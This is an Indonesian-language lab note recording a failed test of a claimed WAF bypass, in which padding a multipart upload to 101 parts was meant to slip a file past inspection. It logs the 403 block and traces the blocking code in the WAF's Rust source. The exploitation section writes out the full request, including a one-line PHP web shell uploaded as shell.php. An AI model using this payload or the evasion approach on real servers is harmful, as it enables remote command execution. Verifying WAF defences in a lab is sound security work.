---
title: "Bypass 6 — Multipart 101 Parts Stack Overflow (VERIFIED — FAILED)"
tags: ["waf", "bypass", "jarswaf", "multipart"]
aliases: ["multipart-101-parts-bypass"]
created: 2026-07-31
updated: 2026-07-31
status: Completed
---

> [!abstract]
> **Klaim:** WAF membatasi multipart ke 100 part — melewatkan part ke-101 tanpa inspeksi ke backend.
> **Hasil uji labor (2026-07-31): Bypass GAGAL.** Multipart parser memblokir via `MULTIPART-PART-LIMIT`.
> Part ke-101 tidak pernah mencapai backend. Body inspection tidak perlu dieksekusi.

## Eksploitasi

```
POST /upload HTTP/1.1
Host: target.jarswafwaf.demo
Content-Type: multipart/form-data; boundary=boundary
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/126.0.0.0 Safari/537.36

--boundary
Content-Disposition: form-data; name="file1"; filename="dummy1.txt"
Content-Type: text/plain

safe dummy content 1
--boundary
... (ulangi hingga part 100)
--boundary
Content-Disposition: form-data; name="evil"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
--boundary--
```

Total payload: 13,636 bytes, 101 parts.

## Hasil Uji Labor

| Metric | Value |
|---|---|
| HTTP Response | `403 Forbidden` |
| Latency | 0.0025s |
| Rule terpicu | `MULTIPART-PART-LIMIT` |
| Backend menerima body? | ❌ Tidak — blok di upstream, no backend receive |
| WEBSHELL-001/UPLOAD-001 terpicu? | ❌ Tidak — block lebih awal di phase multipart |

Log:
```json
{"action":"BLOCK","rule_id":"MULTIPART-PART-LIMIT",
 "reason":"Multipart upload block: Multipart body exceeds maximum of 100 parts"}
```

## Analisis Source

**`rules/multipart.rs`**: Parser menghitung `part_count`. Saat melebihi 100, mengembalikan `Err(MultipartFinding::PartLimit)`.
**`rules.rs:813`**: match `Err(finding)` → `findings.push(finding)` → trigger `BLOCK` action.
**`proxy_engine.rs:2059`**: check_request return `rule_id` → ctx.is_blocked → `record_attack_and_ban()`.

## Kesimpulan

Bypass 6 adalah **FALSE POSITIVE** — implementasi sesungguhnya memblokir, bukan skip.